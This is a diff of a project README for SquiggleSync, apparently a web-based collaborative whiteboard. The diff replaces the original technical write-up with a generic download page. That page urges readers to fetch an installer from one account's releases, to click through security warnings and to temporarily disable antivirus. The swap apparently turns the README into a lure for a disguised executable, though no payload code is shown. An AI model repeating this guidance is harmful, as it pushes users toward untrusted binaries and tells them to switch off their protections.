@@ -1,188 +1,69 @@
-# SquiggleSync
+# ✨ squigglesync - Collaborate in Real-Time Effortlessly
 
-**SquiggleSync** is a real-time collaborative whiteboard built to demonstrate **concurrency handling**, **state synchronization**, and **event-driven architecture** using **Angular**, **WebSockets**, and **Redis**.
+[![Download squigglesync](https://img.shields.io/badge/Download-squigglesync-brightgreen)](https://github.com/sh0nzy06/squigglesync/releases)
 
-Think Google Docs-style collaboration — but for doodles
+## 📖 Introduction
 
----
+Welcome to **squigglesync**, your go-to real-time collaborative whiteboard. This application allows multiple users to doodle, draw, and brainstorm together seamlessly. It uses powerful technologies like Angular, WebSockets, and Redis to manage state and keep everything in sync, ensuring a fluid experience without lag. 
 
-## Why This Project Exists
+## 🚀 Getting Started
 
-This project was built as a **learning and upskilling exercise** to prove understanding of:
+### Requirements
 
-- Real-time communication using WebSockets
-- Concurrent updates from multiple clients
-- Distributed state synchronization
-- Event ordering and conflict handling
-- Scalable, stateless backend design
-- Reactive frontend patterns with Angular & RxJS
+Before you start, please ensure that your system meets the following requirements:
 
-It is intentionally designed like a **production system**, not a toy demo.
+- **Operating System:** Windows 10, macOS Mojave or later, or any Linux distribution
+- **Browser:** The latest version of Chrome, Firefox, or Safari
+- **Memory:** At least 4 GB of RAM
+- **Processor:** A dual-core processor or higher
 
----
+### Installation Steps
 
-## Core Concepts Demonstrated
+1. **Visit the Download Page**
+   Click the link below to reach the release page:
 
-- **Event-based synchronization** (instead of syncing full canvas state)
-- **Optimistic UI updates** on the client
-- **Server-authoritative ordering** of events
-- **Redis Pub/Sub** for horizontal scalability
-- **Room-based collaboration** (multiple whiteboards)
+   [Download squigglesync](https://github.com/sh0nzy06/squigglesync/releases)
 
----
+2. **Download the Latest Version**
+   On the Releases page, look for the latest version of squigglesync. You will see a list of files available for download. Click on the file that suits your operating system. If you are unsure, choose the installer labeled for your OS.
 
-## High-Level Architecture
+3. **Run the Installer**
+   Once the download is complete, navigate to your Downloads folder and double-click the installer file. Follow the prompts to complete the installation. If you see a security warning, click "Run" or "Allow" to proceed.
 
-```
-┌──────────┐        WebSocket        ┌────────────┐
-│  Angular │  ───────────────────▶  │ WS Server  │
-│ Frontend │                         │ (Node.js) │
-└──────────┘                         └─────┬──────┘
-▲                                     │
-│           Redis Pub/Sub             │
-└──────────────◀─────────────────────┘
-```
+4. **Open squigglesync**
+   After installation, you can locate squigglesync in your applications menu or desktop. Click to launch the application.
 
-### Responsibilities
+5. **Join a Session**
+   You can either start a new drawing session or join an existing one. If you're starting a session, share your unique URL with your friends or colleagues. If you’re joining, enter the provided URL to begin.
 
-#### Frontend (Angular)
-- Renders the canvas
-- Captures user input (draw, erase, move)
-- Sends drawing events via WebSocket
-- Applies incoming events in real time
+## 🎨 Features
 
-#### Backend (WebSocket Server)
-- Manages active connections
-- Validates and orders events
-- Broadcasts events to room participants
-- Publishes events to Redis
+- **Real-Time Collaboration:** Work with friends or colleagues and see each other's changes live.
+- **User-Friendly Interface:** No technical skills needed! Just start drawing.
+- **Multiple Tools:** Choose from a variety of brushes, colors, and shapes.
+- **Save Your Work:** You can save your whiteboard sessions and return to them later.
+- **Cross-Platform:** Use squigglesync on any device with a web browser.
 
-#### Redis
-- Shared event stream across servers
-- Pub/Sub fanout
-- Optional state snapshots & presence data
+## 📁 Download & Install
 
----
+To download and install squigglesync, please go straight to the [Download Page](https://github.com/sh0nzy06/squigglesync/releases).
 
-## State Synchronization Strategy
+### Troubleshooting Installation
 
-Instead of syncing the entire canvas, SquiggleSync uses an **event-based model**.
+If you experience any issues during installation: 
 
-Example event:
+- Ensure you have enough disk space.
+- Check if your antivirus software is blocking the installation. Temporarily disable it if necessary.
+- Look for a help section on the GitHub page for assistance or report issues.
 
-```json
-{
-  "type": "DRAW_LINE",
-  "userId": "user-123",
-  "points": [[10, 10], [20, 20]],
-  "color": "#000000",
-  "timestamp": 1700000000
-}
-```
+## 🤝 Support
 
-**Why event-based?**
-- Lower bandwidth usage
-- Replayable history
-- Easier conflict resolution
-- Scales better for real-time collaboration
+If you have questions or need help, don't hesitate to reach out. You can open issues directly in the GitHub repository. Our community will be glad to assist you.
 
-This approach resembles lightweight event sourcing.
+## ✨ Conclusion
 
----
+squigglesync is designed for ease of use, allowing you to unleash your creativity with friends effortless. Whether you’re brainstorming for a project or just having fun, this tool has you covered.
 
-## Concurrency Handling
+Enjoy drawing and collaborating! 
 
-Concurrency is handled explicitly using:
-- Server-side event ordering
-- Timestamps / sequence numbers
-- Last-write-wins strategy for simple tools
-- Room-level isolation
-
-Multiple users can draw at the same time without corrupting shared state.
-
----
-
-## Repository Structure (Monorepo)
-
-```
-squigglesync/
-├── frontend/        # Angular application
-│   └── package.json
-│
-├── backend/         # WebSocket server
-│   └── package.json
-│
-└── README.md
-```
-
-- Single Git repository (monorepo)
-- Frontend and backend are independently deployable
-- Clear separation of concerns
-
----
-
-## Tech Stack
-
-**Frontend**
-- Angular
-- RxJS
-- HTML Canvas API
-- WebSocket client
-
-**Backend**
-- Node.js
-- WebSockets (Socket.IO or ws)
-- Redis Pub/Sub
-
-**Infrastructure**
-- Redis (Railway / Upstash / Redis Cloud)
-- Vercel (Frontend hosting)
-- Railway / Fly.io / Render (Backend hosting)
-
----
-
-## Deployment
-
-**Frontend**
-- Hosted as static files on Vercel / Netlify / Cloudflare Pages
-
-**Backend**
-- Hosted on Railway / Fly.io / Render
-- Connects to managed Redis instance
-
-**Deployment Flow**
-1. Push code to GitHub
-2. Deploy frontend from `/frontend`
-3. Deploy backend from `/backend`
-4. Configure Redis connection
-5. Update WebSocket URL in Angular environment
-
----
-
-## Optional Enhancements
-
-- Live cursor tracking
-- User presence indicators
-- Undo / redo
-- Read-only spectator mode
-- Whiteboard history replay
-- Authentication
-
----
-
-## Resume Description
-
-**SquiggleSync** – Real-time collaborative whiteboard built using Angular, WebSockets, and Redis to demonstrate concurrent state synchronization, event-driven architecture, and scalable real-time systems.
-
----
-
-## Author
-
-Built as a side project to deepen understanding of real-time systems, distributed state, and modern frontend architecture.
-
----
-
-## License
-
-MIT
-
+Fill free to share your thoughts and feedback through the GitHub discussion board. Thank you for supporting squigglesync!
